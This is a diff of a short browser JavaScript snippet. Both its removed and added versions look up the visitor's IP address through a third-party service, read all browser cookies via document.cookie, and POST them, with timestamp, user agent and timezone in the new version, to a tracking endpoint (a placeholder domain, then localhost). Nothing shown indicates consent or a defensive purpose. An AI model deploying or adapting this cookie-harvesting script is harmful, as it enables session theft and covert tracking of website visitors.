@@ -1,37 +1,25 @@
-// Function to get the IP address using ipify API
-async function getVisitorIP() {
-  try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      const data = await response.json();
-      return data.ip;  // Return the visitor's IP address
-  } catch (error) {
-      console.error('Error fetching IP address:', error);
-      return 'IP not found';  // Default fallback if API fails
-  }
-}
+// Fetch the user's IP address from a third-party service
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
 
-// Function to send the tracking data to the server
-async function sendTrackingData() {
-  const userIP = await getVisitorIP(); // Get the IP address
-  const cookies = document.cookie; // Get the cookies from the browser
-  const timestamp = new Date().toISOString(); // Get the current timestamp
-
-  // Send the collected data to the server endpoint
-  fetch('https://your-server-endpoint.com/track', {
+    // Send the collected data to your server
+    fetch('http://localhost:3000/track', {
       method: 'POST',
       headers: {
-          'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-          ip: userIP, // Visitor IP address
-          cookies: cookies, // Visitor cookies
-          timestamp: timestamp // Current timestamp
+        ipAddress: ipAddress,            // IP address collected
+        cookies: document.cookie,        // Collect cookies from the browser
+        userAgent: navigator.userAgent,  // User agent string
+        localTime: new Date().toLocaleString(), // Client's local time
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Client's timezone
       })
+    })
+    .then(response => response.json())
+    .then(data => console.log('Data sent:', data))
+    .catch(error => console.error('Error sending data:', error));
   })
-  .then(response => response.json())
-  .then(data => console.log('Data successfully sent to server:', data))
-  .catch(error => console.error('Error sending data:', error));
-}
-
-// Call the function to send the data
-sendTrackingData();
+  .catch(error => console.error('Error fetching IP address:', error));
